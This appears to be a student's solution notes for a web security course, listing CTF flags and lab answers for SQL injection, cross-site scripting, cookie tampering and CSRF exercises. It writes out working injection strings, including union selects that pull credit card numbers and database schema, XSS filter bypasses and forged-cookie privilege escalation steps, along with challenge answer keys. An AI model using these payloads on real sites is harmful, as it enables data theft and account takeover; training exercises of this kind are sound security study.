# webhack

## week 1 - CTF

Secret Number 1: 92

Secret Number 2 - *CTF{TRIANGLE_NUMBER_SEQUENCE}

Secret Number 3 - *CTF{IDOR_ROCKS!}

Bank Robbers 2 - *CTF{YOU'RE_AN_IMPRESSIVE_THIEF}

Bank Robbers 3 - *CTF{I_SHOULD_HIDE_MY_BELONGINGS}

key player 2 - 3

key player 3 - *CTF{JORDAN_ALSO_BETTER_THAN_ME}

Odd List - *CTF{DECODE_AS_URL}

hidden user - *CTF{SQUARE_NUMBER_SERIES}

Peculiar Employees - *CTF{I_STOLE_DAENERYS_DRAGONS}

Privilege Escalation - *CTF{YOU_GOT_ADMIN_PRIVILEGE}

## week 2

### Lab

SQL Injection Escaping 
`\'   or 1;--`

SQL Injection Challenge Three:  
`Mary Martin' union select CreditCardNumber from customers where customerName = 'Mary Martin`

SQL Injection 5
`couponCode=' union select 1, 2, couponCode from vipCoupons limit 1 # `

### CTF

https://35.188.146.206/public/protected/flags/03/
`*CTF{WHOA_IT_SUPPORTS_LOGICAL_OPERATORS}`

https://35.188.146.206/public/protected/flags/04/
`*CTF{BACK_AGAIN_WITH_ANOTHER_SQLi} . 'or'1`

https://35.188.146.206/public/protected/flags/01/index.php
`*CTF{SQLI_IS_SO_FUN_TO_DO}`

https://35.188.146.206/public/protected/flags/05/?job_type=a&submit=submit


https://35.188.146.206/public/protected/flags/07/
`*CTF{SQLI_IS_MORE_FUN_WITH_HEX}`

https://35.188.146.206/public/protected/flags/08/    `params['job_type'] = 'a' `
`*CTF{ARE_YA_WARMED_UP_YET??}`

https://35.188.146.206/public/protected/flags/09/
`*CTF{OH_YOU_FANCY_HUH}` like before just encoded: `params['job_type'] = 'YQ=='`

https://35.188.146.206/public/protected/flags/10/
`" or 1=1 limit 6,1#         " union select 1,2,3,4,5,schema_name FROM information_schema.schemata limit 1,1# `

`*CTF{sqli_10}`

https://35.188.146.206/public/protected/flags/12/  in both fields: `"or"1`
`*CTF{THIS_FLAG_IS_ONLY_FOR_MR_ADMINISTRATOR}`

https://35.188.146.206/public/protected/flags/13/   'or'1'/**/limit/**/2,1#
*CTF{5.7.21-0ubuntu0.16.04.1}

https://35.188.146.206/public/protected/flags/14/
`*CTF{THE_BEST_COLUMN_NAMES_EVERRR}` :   taken from 15

not solved: 

https://35.188.146.206/public/protected/flags/15/
hints:
```
"or"1"# 
"or"1"union select 1,2 limit 1,29#

"or"1"union select TABLE_NAME,COLUMN_NAME from information_schema.COLUMNS limit 1000,1000#
```

## Week 3 - Lab

Cross Site Scripting Two
`"<INPUT TYPE="text" onblur="alert('XSS')"/>"`

3
`<META onpaonpageonpagonpageonpageshowshoweshowshowgeshow="alert(1)";`

4
`http://blabla.com"  oNpageshow=alert('XSS') `

## codepath websecurity week 4

Implementing CSRF as an exercise, more details:
https://guides.codepath.com/websecurity/Cross-Site-Request-Forgery

### Lab

ex 0: easy (just look at the response)

ex 1: from the cookie, base64, modify to: `userRole=administrator` and re-encode

ex 2: try administrator as username, you'll get the email: buzzthebald@shepherd.com
take the request of the reset pwd and try to change the cookie to admin:
changed To: -3511607529262...
now log in...

ex 3. same like before only now we have a new `current` field in the cookie, decrypting it twice with base 64 shows something like `guest12`, reverse engineer using `admin` or `administrator` and use the new 'fixed` current with the login using the new password that we just submitted for a change

ex 4. simply follow the instructions and submit the url as they suggest:
https://security.codepath.com/root/grantComplete/csrfLesson?userId=1139997297 

ex 5. CSRF - upload the url: https://security.codepath.com/user/csrfchallengeone/plusplus?userid=<your user id> and once enough other users loaded the page your counter will go to zero

ex 6. create a page with a hidden form like they show on the guide, use the url and wait for someone to load the page, see:
https://github.com/alfasin/webhack/blob/master/fake_form.html

### CTF


